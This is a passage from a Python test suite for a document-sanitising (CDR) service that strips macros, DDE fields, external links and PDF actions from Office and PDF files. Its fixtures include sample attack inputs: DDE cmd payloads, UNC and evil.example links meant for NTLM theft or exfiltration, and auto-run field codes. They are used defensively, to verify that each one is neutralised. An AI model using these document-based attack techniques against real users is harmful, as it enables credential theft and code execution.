            cdr._MAX_ENTRY_BYTES = original_limit


class TestOtherOfficeFormats:
    """CDR on Office formats beyond docx/xlsx/xlsb — pptx, dotm extension remap,
    and ppam all processed without error and with macros stripped."""

    def _make_pptx_with_vba(self) -> bytes:
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as z:
            z.writestr("[Content_Types].xml",
                       '<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/'
                       'package/2006/content-types">'
                       '<Default Extension="rels" ContentType="application/vnd.openxmlformats-'
                       'package.relationships+xml"/>'
                       '<Override PartName="/ppt/presentation.xml" ContentType="application/'
                       'vnd.openxmlformats-officedocument.presentationml.presentation.main+xml"/>'
                       '</Types>')
            z.writestr("_rels/.rels", _minimal_rels())
            z.writestr("ppt/vbaProject.bin", b"\xd0\xcf\x11\xe0MACRO")
            z.writestr("ppt/presentation.xml", "<p:presentation/>")
        return buf.getvalue()

    def _make_dotm(self) -> bytes:
        """Minimal .dotm (macro-enabled Word template) with a vbaProject."""
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as z:
            z.writestr("[Content_Types].xml",
                       '<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/'
                       'package/2006/content-types">'
                       '<Override PartName="/word/document.xml" ContentType="application/'
                       'vnd.ms-word.template.macroEnabledTemplate.main+xml"/>'
                       '</Types>')
            z.writestr("_rels/.rels", _minimal_rels())
            z.writestr("word/vbaProject.bin", b"\xd0\xcf\x11\xe0MACRO")
            z.writestr("word/document.xml", "<w:document/>")
        return buf.getvalue()

    def _make_ppam(self) -> bytes:
        """Minimal .ppam (PowerPoint macro-enabled add-in)."""
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as z:
            z.writestr("[Content_Types].xml",
                       '<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/'
                       'package/2006/content-types">'
                       '<Default Extension="ext" ContentType="application/'
                       'vnd.ms-powerpoint.addin.macroEnabled.12"/>'
                       '</Types>')
            z.writestr("_rels/.rels", _minimal_rels())
            z.writestr("ppt/vbaProject.bin", b"\xd0\xcf\x11\xe0MACRO")
            z.writestr("ppt/presentation.xml", "<p:presentation/>")
        return buf.getvalue()

    def test_pptx_vba_stripped(self):
        clean, report = cdr.cdr_office(self._make_pptx_with_vba(), "pptx")
        with zipfile.ZipFile(io.BytesIO(clean)) as z:
            names = [n.lower() for n in z.namelist()]
        assert not any("vbaproject.bin" in n for n in names)
        assert report["cdr_mode"] == "full"

    def test_dotm_remapped_to_dotx(self):
        """dotm is handled as a dotx after extension remap — macro type replaced."""
        clean, report = cdr.cdr_office(self._make_dotm(), "dotm")
        with zipfile.ZipFile(io.BytesIO(clean)) as z:
            ct_xml = z.read("[Content_Types].xml").decode()
        assert "macroEnabled" not in ct_xml
        assert not any("vbaproject.bin" in n.lower() for n in z.namelist())

    def test_ppam_macro_content_type_replaced(self):
        clean, report = cdr.cdr_office(self._make_ppam(), "ppam")
        with zipfile.ZipFile(io.BytesIO(clean)) as z:
            ct_xml = z.read("[Content_Types].xml").decode()
        assert "macroEnabled" not in ct_xml
        assert report["cdr_mode"] == "full"

    def test_pptm_remaps_to_pptx_in_handler(self):
        """handler() renames pptm → pptx in the destination key."""
        event = {"detail": {"bucket": {"name": "src"}, "object": {"key": "slides.pptm", "size": 512}}}
        with patch.object(cdr, "_download", return_value=(self._make_pptx_with_vba(), "application/octet-stream")), \
             patch.object(cdr, "_upload") as mock_ul, \
             patch.object(cdr, "_publish_result_safe"), \
             patch.object(cdr, "s3") as mock_s3:
            mock_s3.delete_object.return_value = {}
            result = cdr.handler(event, None)

        assert result["status"] == "sanitised"
        dest = mock_ul.call_args[0][1]  # second positional arg is dest key
        assert dest.endswith(".pptx"), f"expected pptx extension, got: {dest}"


class TestRemainingOfficeFormats:
    """CDR on the 7 untested Office formats: dotx, xltx, xltm, xlam, potx, potm, ppsx.
    Each test verifies: VBA stripped, no macro content type survives, extension remap
    is correct where applicable."""

    def _make_ooxml(self, vba_path: str, content_type: str, ct_attr: str = "Override",
                    ct_part: str = "/doc/main.xml") -> bytes:
        """Generic OOXML fixture with a vbaProject.bin and one content type entry."""
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as z:
            if ct_attr == "Override":
                ct = (f'<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/'
                      f'package/2006/content-types">'
                      f'<Override PartName="{ct_part}" ContentType="{content_type}"/>'
                      f'</Types>')
            else:
                ct = (f'<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/'
                      f'package/2006/content-types">'
                      f'<Default Extension="ext" ContentType="{content_type}"/>'
                      f'</Types>')
            z.writestr("[Content_Types].xml", ct)
            z.writestr("_rels/.rels", _minimal_rels())
            z.writestr(vba_path, b"\xd0\xcf\x11\xe0MACRO")
            z.writestr("word/document.xml", "<doc/>")
        return buf.getvalue()

    def _handler_event(self, key: str) -> dict:
        return {"detail": {"bucket": {"name": "src"}, "object": {"key": key, "size": 512}}}

    # ── dotx — clean Word template (no macro, VBA still stripped if present) ──

    def test_dotx_vba_stripped(self):
        data = self._make_ooxml("word/vbaProject.bin",
                                "application/vnd.openxmlformats-officedocument.wordprocessingml.template.main+xml")
        clean, report = cdr.cdr_office(data, "dotx")
        with zipfile.ZipFile(io.BytesIO(clean)) as z:
            assert not any("vbaproject.bin" in n.lower() for n in z.namelist())
        assert report["cdr_mode"] == "full"

    # ── xltx — clean Excel template ──

    def test_xltx_vba_stripped(self):
        data = self._make_ooxml("xl/vbaProject.bin",
                                "application/vnd.openxmlformats-officedocument.spreadsheetml.template.main+xml")
        clean, report = cdr.cdr_office(data, "xltx")
        with zipfile.ZipFile(io.BytesIO(clean)) as z:
            assert not any("vbaproject.bin" in n.lower() for n in z.namelist())

    # ── xltm — macro Excel template → remaps to xltx ──

    def test_xltm_macro_content_type_replaced(self):
        data = self._make_ooxml("xl/vbaProject.bin",
                                "application/vnd.ms-excel.template.macroEnabled.main+xml")
        clean, _ = cdr.cdr_office(data, "xltm")
        with zipfile.ZipFile(io.BytesIO(clean)) as z:
            ct = z.read("[Content_Types].xml").decode()
        assert "macroEnabled" not in ct
        assert "spreadsheetml.template" in ct

    def test_xltm_remaps_to_xltx_in_handler(self):
        data = self._make_ooxml("xl/vbaProject.bin",
                                "application/vnd.ms-excel.template.macroEnabled.main+xml")
        with patch.object(cdr, "_download", return_value=(data, "application/octet-stream")), \
             patch.object(cdr, "_upload") as mock_ul, \
             patch.object(cdr, "_publish_result_safe"), \
             patch.object(cdr, "s3") as mock_s3:
            mock_s3.delete_object.return_value = {}
            result = cdr.handler(self._handler_event("book.xltm"), None)
        assert result["status"] == "sanitised"
        dest = mock_ul.call_args[0][1]
        assert dest.endswith(".xltx"), f"expected xltx, got: {dest}"

    # ── xlam — Excel add-in → remaps to xlsx ──

    def test_xlam_macro_content_type_replaced(self):
        data = self._make_ooxml("xl/vbaProject.bin",
                                "application/vnd.ms-excel.addin.macroEnabled.12",
                                ct_attr="Default")
        clean, _ = cdr.cdr_office(data, "xlam")
        with zipfile.ZipFile(io.BytesIO(clean)) as z:
            ct = z.read("[Content_Types].xml").decode()
        assert "macroEnabled" not in ct

    def test_xlam_remaps_to_xlsx_in_handler(self):
        data = self._make_ooxml("xl/vbaProject.bin",
                                "application/vnd.ms-excel.addin.macroEnabled.12",
                                ct_attr="Default")
        with patch.object(cdr, "_download", return_value=(data, "application/octet-stream")), \
             patch.object(cdr, "_upload") as mock_ul, \
             patch.object(cdr, "_publish_result_safe"), \
             patch.object(cdr, "s3") as mock_s3:
            mock_s3.delete_object.return_value = {}
            result = cdr.handler(self._handler_event("addin.xlam"), None)
        assert result["status"] == "sanitised"
        dest = mock_ul.call_args[0][1]
        assert dest.endswith(".xlsx"), f"expected xlsx, got: {dest}"

    # ── potx — clean PowerPoint template ──

    def test_potx_vba_stripped(self):
        data = self._make_ooxml("ppt/vbaProject.bin",
                                "application/vnd.openxmlformats-officedocument.presentationml.template.main+xml")
        clean, report = cdr.cdr_office(data, "potx")
        with zipfile.ZipFile(io.BytesIO(clean)) as z:
            assert not any("vbaproject.bin" in n.lower() for n in z.namelist())
        assert report["cdr_mode"] == "full"

    # ── potm — macro PowerPoint template → remaps to potx ──

    def test_potm_macro_content_type_replaced(self):
        data = self._make_ooxml("ppt/vbaProject.bin",
                                "application/vnd.ms-powerpoint.template.macroEnabled.main+xml")
        clean, _ = cdr.cdr_office(data, "potm")
        with zipfile.ZipFile(io.BytesIO(clean)) as z:
            ct = z.read("[Content_Types].xml").decode()
        assert "macroEnabled" not in ct
        assert "presentationml.template" in ct

    def test_potm_remaps_to_potx_in_handler(self):
        data = self._make_ooxml("ppt/vbaProject.bin",
                                "application/vnd.ms-powerpoint.template.macroEnabled.main+xml")
        with patch.object(cdr, "_download", return_value=(data, "application/octet-stream")), \
             patch.object(cdr, "_upload") as mock_ul, \
             patch.object(cdr, "_publish_result_safe"), \
             patch.object(cdr, "s3") as mock_s3:
            mock_s3.delete_object.return_value = {}
            result = cdr.handler(self._handler_event("template.potm"), None)
        assert result["status"] == "sanitised"
        dest = mock_ul.call_args[0][1]
        assert dest.endswith(".potx"), f"expected potx, got: {dest}"

    # ── ppsx — clean PowerPoint slideshow ──

    def test_ppsx_vba_stripped(self):
        data = self._make_ooxml("ppt/vbaProject.bin",
                                "application/vnd.openxmlformats-officedocument.presentationml.slideshow.main+xml")
        clean, report = cdr.cdr_office(data, "ppsx")
        with zipfile.ZipFile(io.BytesIO(clean)) as z:
            assert not any("vbaproject.bin" in n.lower() for n in z.namelist())
        assert report["cdr_mode"] == "full"


class TestMultiThreatIntegration:
    """End-to-end integration: a single fixture that carries multiple simultaneous
    threats — VBA macro, dangerous rels, macro content type, and MACROBUTTON field
    code — is fully disarmed in one cdr_office() call, with all threats recorded
    in the report."""

    def _make_multi_threat_docm(self) -> bytes:
        """docm carrying:
          1. xl/vbaProject.bin  (VBA macro binary)
          2. word/_rels/document.xml.rels with an externalLink relationship
          3. [Content_Types].xml with macro-enabled part type
          4. word/document.xml with a MACROBUTTON field code
        """
        ns_pkg  = "http://schemas.openxmlformats.org/package/2006/relationships"
        ext_rel = ("http://schemas.openxmlformats.org/officeDocument/2006/"
                   "relationships/externalLink")
        vba_rel = "http://schemas.microsoft.com/office/2006/relationships/vbaProject"

        rels_xml = (
            f'<?xml version="1.0"?>'
            f'<Relationships xmlns="{ns_pkg}">'
            f'<Relationship Id="rId1" Type="{ext_rel}" Target="externalLinks/link1.xml"/>'
            f'<Relationship Id="rId2" Type="{vba_rel}" Target="vbaProject.bin"/>'
            f'</Relationships>'
        )
        doc_xml = (
            '<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">'
            '<w:body>'
            '<w:p><w:fldChar w:fldCharType="begin"/></w:p>'
            '<w:p><w:instrText> MACROBUTTON HiddenButton Click Me </w:instrText></w:p>'
            '<w:p><w:fldChar w:fldCharType="end"/></w:p>'
            '</w:body>'
            '</w:document>'
        )
        ct_xml = (
            '<?xml version="1.0"?>'
            '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
            '<Override PartName="/word/document.xml"'
            ' ContentType="application/vnd.ms-word.document.macroEnabled.main+xml"/>'
            '<Default Extension="bin"'
            ' ContentType="application/vnd.ms-office.vbaProject"/>'
            '</Types>'
        )

        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as z:
            z.writestr("[Content_Types].xml", ct_xml)
            z.writestr("_rels/.rels", _minimal_rels())
            z.writestr("word/_rels/document.xml.rels", rels_xml)
            z.writestr("word/vbaProject.bin", b"\xd0\xcf\x11\xe0MACRO_PAYLOAD")
            z.writestr("word/document.xml", doc_xml)
        return buf.getvalue()

    def test_all_threats_removed(self):
        clean, report = cdr.cdr_office(self._make_multi_threat_docm(), "docm")

        with zipfile.ZipFile(io.BytesIO(clean)) as z:
            names      = [n.lower() for n in z.namelist()]
            ct_xml     = z.read("[Content_Types].xml").decode()
            rels_xml   = z.read("word/_rels/document.xml.rels").decode()
            doc_xml    = z.read("word/document.xml").decode()

        # 1. VBA binary gone
        assert not any("vbaproject.bin" in n for n in names), "VBA binary still present"

        # 2. Macro content type replaced
        assert "macroEnabled" not in ct_xml, "macro content type not replaced"
        assert "wordprocessingml.document.main+xml" in ct_xml, "clean CT not written"

        # 3. VBA Default content type entry removed
        assert "vbaProject" not in ct_xml, "vbaProject CT still present"

        # 4. Dangerous relationship stripped from rels
        assert "externalLink" not in rels_xml, "externalLink rel not stripped"
        assert "vbaProject" not in rels_xml, "vbaProject rel not stripped"

        # 5. MACROBUTTON macro name neutralised in document XML
        #    _strip_xml_macros replaces the macro name with _CDR_REMOVED_, preserving structure
        assert "MACROBUTTON HiddenButton" not in doc_xml, "MACROBUTTON macro name not neutralised"
        assert "_CDR_REMOVED_" in doc_xml, "CDR neutralisation marker not written"

    def test_report_records_all_removals(self):
        _, report = cdr.cdr_office(self._make_multi_threat_docm(), "docm")
        removed = report["removed"]

        assert any("vbaProject.bin" in r for r in removed), "VBA removal not in report"
        assert any("externalLink" in r or "rId1" in r for r in removed), \
            "externalLink rel removal not in report"
        assert report["cdr_mode"] == "full"

    def test_output_is_valid_zip(self):
        clean, _ = cdr.cdr_office(self._make_multi_threat_docm(), "docm")
        # Must re-open as a valid ZIP — no corruption from CDR
        with zipfile.ZipFile(io.BytesIO(clean)) as z:
            assert len(z.namelist()) > 0

    def test_handler_end_to_end_multi_threat(self):
        """Full handler() path: download → CDR → upload sanitised → delete source."""
        event = {"detail": {"bucket": {"name": "src"}, "object": {"key": "evil.docm", "size": 512}}}
        with patch.object(cdr, "_download",
                          return_value=(self._make_multi_threat_docm(), "application/octet-stream")), \
             patch.object(cdr, "_upload") as mock_ul, \
             patch.object(cdr, "_publish_result_safe") as mock_pub, \
             patch.object(cdr, "s3") as mock_s3:
            mock_s3.delete_object.return_value = {}
            result = cdr.handler(event, None)

        # Status and extension remap (docm → docx)
        assert result["status"] == "sanitised"
        dest = mock_ul.call_args[0][1]
        assert dest.endswith(".docx"), f"docm should remap to docx, got: {dest}"

        # Source deleted
        mock_s3.delete_object.assert_called_once_with(Bucket="src", Key="evil.docm")

        # Result published — payload structure: {original_ext, report: {removed: [...]}}
        pub_call = mock_pub.call_args
        assert pub_call[0][2] == "sanitised"
        payload = pub_call[0][3]
        assert len(payload["report"].get("removed", [])) > 0, "no removals in published result"


class TestDenylistGaps:
    """Audit MEDIUM findings: denylist gaps where active/remote content survived CDR."""

    def _office_zip(self, entries: dict) -> bytes:
        base = {
            "[Content_Types].xml": _minimal_content_types().encode(),
            "_rels/.rels": _minimal_rels().encode(),
        }
        base.update(entries)
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as z:
            for name, data in base.items():
                z.writestr(name, data)
        return buf.getvalue()

    def test_embedded_ole_object_dropped(self):
        """word/embeddings/oleObject1.bin (renamed payload) — the PART must be dropped,
        not just its relationship (M1)."""
        data = self._office_zip({
            "word/document.xml": b"<document/>",
            "word/embeddings/oleObject1.bin": b"MZ\x90\x00 fake exe payload",
        })
        clean, report = cdr.cdr_office(data, "docx")
        with zipfile.ZipFile(io.BytesIO(clean)) as z:
            assert not any("embeddings" in n.lower() for n in z.namelist())
        assert any("embeddings" in r.lower() for r in report["removed"])

    def test_xl_embeddings_dropped(self):
        data = self._office_zip({
            "xl/workbook.xml": b"<workbook/>",
            "xl/embeddings/oleObject1.bin": b"\xd0\xcf\x11\xe0 ole",
        })
        clean, _ = cdr.cdr_office(data, "xlsx")
        with zipfile.ZipFile(io.BytesIO(clean)) as z:
            assert not any("embeddings" in n.lower() for n in z.namelist())

    def test_altchunk_element_neutralised(self):
        """<w:altChunk r:id=.../> imports arbitrary HTML/MHTML that bypasses the macro
        scrub — the element must be neutralised so the import cannot fire (M2)."""
        xml = b'<w:body><w:altChunk r:id="rId99"/></w:body>'
        clean, removed = cdr._strip_xml_macros(xml, "document.xml")
        # The tag is renamed so Word no longer treats it as an altChunk import element.
        assert b"<w:altChunk" not in clean
        assert b"_CDR_REMOVED_altChunk" in clean
        assert any("altChunk" in r for r in removed)

    def test_afchunk_relationship_stripped(self):
        rels = (
            '<?xml version="1.0"?>'
            '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
            '<Relationship Id="rId99" '
            'Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/aFChunk" '
            'Target="afchunk.mht"/></Relationships>'
        ).encode()
        clean, removed = cdr._strip_rels(rels)
        assert b"aFChunk" not in clean
        assert any("aFChunk" in r for r in removed)

    def test_external_hyperlink_target_neutralised(self):
        """External hyperlink rel: Target rewritten to inert, rel KEPT so r:id doesn't
        dangle (M5). Covers UNC NTLM-theft and phishing URLs."""
        rels = (
            '<?xml version="1.0"?>'
            '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
            '<Relationship Id="rId5" '
            'Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" '
            'Target="\\\\attacker\\share\\x" TargetMode="External"/></Relationships>'
        ).encode()
        clean, removed = cdr._strip_rels(rels)
        assert b"attacker" not in clean
        assert b'Id="rId5"' in clean  # rel preserved — no dangling r:id
        assert b"_CDR_REMOVED_" in clean
        assert any("hyperlink" in r for r in removed)

    def test_internal_hyperlink_target_preserved(self):
        """An internal (non-External) hyperlink rel must be left alone."""
        rels = (
            '<?xml version="1.0"?>'
            '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
            '<Relationship Id="rId6" '
            'Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" '
            'Target="#bookmark1"/></Relationships>'
        ).encode()
        clean, removed = cdr._strip_rels(rels)
        assert b"#bookmark1" in clean
        assert removed == []

    # ── PDF denylist gaps ────────────────────────────────────────────────────────

    def _pdf_with_outline_action(self) -> bytes:
        pdf = pikepdf.Pdf.new()
        page = pdf.make_indirect(pikepdf.Dictionary(
            Type=pikepdf.Name("/Page"), MediaBox=pikepdf.Array([0, 0, 612, 792]),
        ))
        pdf.pages.append(pikepdf.Page(page))
        item = pdf.make_indirect(pikepdf.Dictionary(
            Title=pikepdf.String("Click me"),
            A=pikepdf.Dictionary(S=pikepdf.Name("/JavaScript"),
                                 JS=pikepdf.String("app.alert('x')")),
        ))
        pdf.Root["/Outlines"] = pikepdf.Dictionary(
            Type=pikepdf.Name("/Outlines"), First=item, Last=item, Count=1)
        buf = io.BytesIO()
        pdf.save(buf)
        return buf.getvalue()

    def test_pdf_outline_action_stripped(self):
        """Bookmark (/Outlines) item /A JavaScript fires on click and was never swept (M3)."""
        clean, report = cdr.cdr_pdf(self._pdf_with_outline_action())
        with pikepdf.open(io.BytesIO(clean)) as out:
            outlines = out.Root.get("/Outlines")
            if outlines is not None:
                node = outlines.get("/First")
                if node is not None:
                    assert "/A" not in node, "outline action survived"
        assert any("outline" in r for r in report["removed"])

    def test_pdf_goToE_annotation_action_stripped(self):
        """/GoToE (re-reaches embedded files) was not in the old denylist; the new
        unconditional /A deletion catches it (M4)."""
        pdf = pikepdf.Pdf.new()
        annot = pikepdf.Dictionary(
            Type=pikepdf.Name("/Annot"), Subtype=pikepdf.Name("/Link"),
            A=pikepdf.Dictionary(S=pikepdf.Name("/GoToE")),
        )
        page = pdf.make_indirect(pikepdf.Dictionary(
            Type=pikepdf.Name("/Page"), MediaBox=pikepdf.Array([0, 0, 612, 792]),
            Annots=pikepdf.Array([annot]),
        ))
        pdf.pages.append(pikepdf.Page(page))
        buf = io.BytesIO()
        pdf.save(buf)
        clean, _ = cdr.cdr_pdf(buf.getvalue())
        with pikepdf.open(io.BytesIO(clean)) as out:
            for a in out.pages[0].get("/Annots", []):
                assert "/A" not in a

    def test_pdf_richmedia_annotation_neutralised(self):
        """/RichMedia annotation payload lives in /RichMediaContent — subtype neutralised
        and content dropped (M4)."""
        pdf = pikepdf.Pdf.new()
        annot = pikepdf.Dictionary(
            Type=pikepdf.Name("/Annot"), Subtype=pikepdf.Name("/RichMedia"),
            RichMediaContent=pikepdf.Dictionary(),
        )
        page = pdf.make_indirect(pikepdf.Dictionary(
            Type=pikepdf.Name("/Page"), MediaBox=pikepdf.Array([0, 0, 612, 792]),
            Annots=pikepdf.Array([annot]),
        ))
        pdf.pages.append(pikepdf.Page(page))
        buf = io.BytesIO()
        pdf.save(buf)
        clean, report = cdr.cdr_pdf(buf.getvalue())
        with pikepdf.open(io.BytesIO(clean)) as out:
            for a in out.pages[0].get("/Annots", []):
                assert a.get("/Subtype") != "/RichMedia"
                assert "/RichMediaContent" not in a
        assert any("multimedia" in r for r in report["removed"])

    def test_webextension_parts_dropped(self):
        """Office Web Add-in (task pane) parts auto-load remote code — drop them (LOW)."""
        data = self._office_zip({
            "word/document.xml": b"<document/>",
            "word/webextensions/taskpanes.xml": b"<wetp:taskpanes/>",
            "word/webextensions/webextension1.xml": b'<we:webextension/>',
        })
        clean, report = cdr.cdr_office(data, "docx")
        with zipfile.ZipFile(io.BytesIO(clean)) as z:
            assert not any("webextensions" in n.lower() for n in z.namelist())
        assert any("webextensions" in r.lower() for r in report["removed"])

    def test_dde_false_positive_benign_text_preserved(self):
        """Benign prose like 'Profit|Loss!Important' (pipe + word, not a cell ref) must
        NOT be corrupted to an unbalanced _CDR_REMOVED_( (L4)."""
        xml = b"<w:t>Profit|Loss!Important budget review</w:t>"
        clean, removed = cdr._strip_xml_macros(xml, "document.xml")
        assert clean == xml
        assert removed == []

    def test_dde_real_cell_ref_still_neutralised(self):
        """A genuine DDE pipe link targeting a cell ref must still be caught (L4)."""
        for payload in (
            b"<w:t>cmd| ' /c calc'!A1</w:t>",
            b"<w:t>app|topic!$B$2</w:t>",
            b"<w:t>x|y!R1C1</w:t>",
        ):
            clean, removed = cdr._strip_xml_macros(payload, "document.xml")
            assert b"_CDR_REMOVED_" in clean, f"not neutralised: {payload!r}"
            assert len(removed) > 0


class TestStripXmlMacrosRegex:
    """Regression tests for _strip_xml_macros edge cases."""

    def test_onclick_double_quoted_stripped(self):
        xml = b'<w:r onClick="runMacro()">text</w:r>'
        clean, removed = cdr._strip_xml_macros(xml, "test.xml")
        assert b'onClick' not in clean
        assert len(removed) > 0

    def test_onclick_single_quoted_stripped(self):
        """Single-quoted attribute values must be stripped — the old regex using [^\2]
        only matched the literal STX character, not the closing quote."""
        xml = b"<w:r onClick='runMacro()'>text</w:r>"
        clean, removed = cdr._strip_xml_macros(xml, "test.xml")
        assert b'onClick' not in clean
        assert len(removed) > 0

    def test_action_attribute_with_url_stripped(self):
        xml = b'<a:ext onAction="http://evil.example/x">click</a:ext>'
        clean, removed = cdr._strip_xml_macros(xml, "slide.xml")
        assert b'onAction' not in clean

    def test_safe_xml_unmodified(self):
        xml = b'<w:r w:rsidR="001A2B3C"><w:t>Hello</w:t></w:r>'
        clean, removed = cdr._strip_xml_macros(xml, "doc.xml")
        assert removed == []
        assert clean == xml

    def test_autoopen_neutralised(self):
        """AUTOOPEN has no argument — the name itself is suffixed with _CDR_REMOVED_."""
        xml = b'<w:instrText> AUTOOPEN </w:instrText>'
        clean, removed = cdr._strip_xml_macros(xml, "doc.xml")
        assert b'AUTOOPEN_CDR_REMOVED_' in clean
        assert b'AUTOOPEN ' not in clean  # bare AUTOOPEN gone
        assert len(removed) > 0

    def test_autoexit_autonew_autoclose_neutralised(self):
        for name in (b"AUTOEXIT", b"AUTONEW", b"AUTOCLOSE"):
            xml = b'<w:instrText> ' + name + b' SomeMacro </w:instrText>'
            clean, removed = cdr._strip_xml_macros(xml, "doc.xml")
            assert name + b"_CDR_REMOVED_" in clean, f"{name!r} not neutralised"
            assert len(removed) > 0

    def test_include_field_neutralised(self):
        """INCLUDE fetches external files — the target path is neutralised."""
        xml = b'<w:instrText> INCLUDE \\\\server\\share\\evil.docx </w:instrText>'
        clean, removed = cdr._strip_xml_macros(xml, "doc.xml")
        assert b'INCLUDE _CDR_REMOVED_' in clean
        assert len(removed) > 0

    def test_includetext_includepicture_link_neutralised(self):
        for field in (b"INCLUDETEXT", b"INCLUDEPICTURE", b"LINK"):
            xml = b'<w:instrText> ' + field + b' http://evil.example/x </w:instrText>'
            clean, removed = cdr._strip_xml_macros(xml, "doc.xml")
            assert field + b" _CDR_REMOVED_" in clean, f"{field!r} not neutralised"
            assert len(removed) > 0

    def test_automobile_not_matched(self):
        """'automobile' must not match the AUTO pattern — word boundary is required."""
        xml = b'<w:t>I drive an automobile</w:t>'
        clean, removed = cdr._strip_xml_macros(xml, "doc.xml")
        assert removed == []
        assert clean == xml

    def test_webservice_no_parens_neutralised(self):
        """WEBSERVICE Word field form (no parentheses) fetches URLs on open — must be caught."""
        xml = b'<w:instrText> WEBSERVICE "http://evil.example/exfil" </w:instrText>'
        clean, removed = cdr._strip_xml_macros(xml, "doc.xml")
        assert b'WEBSERVICE _CDR_REMOVED_' in clean
        assert b'evil.example' not in clean
        assert len(removed) > 0

    def test_hyperlink_no_parens_neutralised(self):
        """HYPERLINK Word field form (no parentheses) with UNC path triggers NTLM theft."""
        xml = b'<w:instrText> HYPERLINK "\\\\evil-server\\share\\file" </w:instrText>'
        clean, removed = cdr._strip_xml_macros(xml, "doc.xml")
        assert b'HYPERLINK _CDR_REMOVED_' in clean
        assert b'evil-server' not in clean
        assert len(removed) > 0

    def test_xml_entity_encoded_dde_neutralised(self):
        """&#68;&#68;&#69; is entity-encoded 'DDE' — must be decoded and caught before regex."""
        xml = '&#68;&#68;&#69; http://evil.example'.encode()
        clean, removed = cdr._strip_xml_macros(xml, "doc.xml")
        # The entity-encoded keyword run is neutralised in place; the literal 'DDE'
        # keyword never appears in the output (encoded form fully replaced), and the
        # benign URL text is preserved.
        assert b'_CDR_REMOVED_' in clean
        assert b'DDE' not in clean
        assert b'http://evil.example' in clean
        assert len(removed) > 0

    def test_benign_xml_escape_preserved(self):
        """Legitimate &amp; in content must survive — not be decoded into invalid XML."""
        xml = '<w:t>AT&amp;T contract</w:t>'.encode()
        clean, removed = cdr._strip_xml_macros(xml, "doc.xml")
        assert b'AT&amp;T contract' in clean
        assert removed == []

    def test_xml_entity_encoded_macrobutton_neutralised(self):
        """&#77;ACROBUTTON (partial entity encoding) is decoded before regex match."""
        # &#77; = 'M', so this is 'MACROBUTTON'
        xml = '&#77;ACROBUTTON HiddenButton Click'.encode()
        clean, removed = cdr._strip_xml_macros(xml, "doc.xml")
        assert b'MACROBUTTON HiddenButton' not in clean
        assert len(removed) > 0

    def test_dde_pipe_quoted_app_name_neutralised(self):
        """DDE pipe form with a quoted/bracketed app name must be neutralised — the old
        regex excluded quotes/brackets before the pipe, allowing a trivial bypass."""
        for payload in (
            b'<w:t>"cmd"| \' /c calc\'!A1</w:t>',
            b"<w:t>'cmd'| ' /c calc'!A1</w:t>",
            b'<w:t>[cmd]| \' /c calc\'!A1</w:t>',
            b'<w:t>cmd| \' /c calc\'!A1</w:t>',
        ):
            clean, removed = cdr._strip_xml_macros(payload, "sheet.xml")
            assert b'_CDR_REMOVED_' in clean, f"not neutralised: {payload!r}"
            assert b'!A1' not in clean, f"DDE target survived: {payload!r}"
            assert len(removed) > 0


class TestEncTag:
    """_enc_tag reduces a string to S3's allowed tag character set (NOT percent-encoding —
    S3 rejects '%' as InvalidTag) and caps length. Regression for the live InvalidTag /
    InvalidArgument failures where a ZIP-anomaly reason (containing quotes/colons/'=') sank
    the quarantine write. S3 allows letters/digits/spaces and + - . _ : / @ in a value;
    '=' and '&' are excluded because they are the Tagging query-string separators."""

    def test_short_value_unchanged(self):
        assert cdr._enc_tag("rejected", 256) == "rejected"

    def test_no_percent_encoding(self):
        # Must NOT percent-encode — S3 rejects '%'. Disallowed chars become '_'.
        out = cdr._enc_tag("duplicate ZIP entry: 'word/document.xml'", 256)
        assert "%" not in out
        assert "'" not in out                 # quote → '_'
        assert "ZIP entry: " in out           # safe chars (space, colon) preserved
        assert "word/document.xml" in out     # '/' and '.' are S3-safe

    def test_separators_and_injection_neutralised(self):
        # '&' and '=' (Tagging separators) must not survive — else a filename could inject
        # extra tag pairs or break parsing.
        out = cdr._enc_tag("evil&cdr-status=clean=injection", 256)
        assert "&" not in out and "=" not in out

    def test_length_capped(self):
        out = cdr._enc_tag("reason " + "x" * 500, 256)
        assert len(out) <= 256

    def test_s3_safe_chars_preserved(self):
        ok = "abcXYZ 012 +-._:/@"
        assert cdr._enc_tag(ok, 256) == ok


class TestTruncateRemoved:
    """_truncate_removed caps 'removed' lists at 100 entries at both nesting levels."""

    def test_flat_removed_truncated(self):
        report = {"removed": [f"entry{i}" for i in range(200)], "format": "xlsx"}
        result = cdr._truncate_removed(report)
        assert len(result["removed"]) == 101
        assert "and 100 more" in result["removed"][-1]

    def test_nested_report_removed_truncated(self):
        inner = {"removed": [f"e{i}" for i in range(150)]}
        report = {"original_ext": "docx", "report": inner}
        result = cdr._truncate_removed(report)
        assert len(result["report"]["removed"]) == 101
        assert "and 50 more" in result["report"]["removed"][-1]

    def test_short_list_unchanged(self):
        report = {"removed": ["entry1", "entry2"], "report": {"removed": ["r1"]}}
        result = cdr._truncate_removed(report)
        assert result["removed"] == ["entry1", "entry2"]
        assert result["report"]["removed"] == ["r1"]

    def test_flat_report_without_removed_unchanged(self):
        report = {"reason": "file too large", "size": 999}
        result = cdr._truncate_removed(report)
        assert result == {"reason": "file too large", "size": 999}

    def test_large_entry_names_bounded_by_bytes(self):
        # 50 entries, each a 20 KB attacker-controlled name → 1 MB total, well over the
        # 256 KB SNS limit even though the count (50) is under the 100-entry cap.
        big = "A" * 20_000
        report = {"removed": [f"{big}{i}" for i in range(50)], "format": "xlsx"}
        result = cdr._truncate_removed(report)
        serialised = len(__import__("json").dumps(result["removed"]))
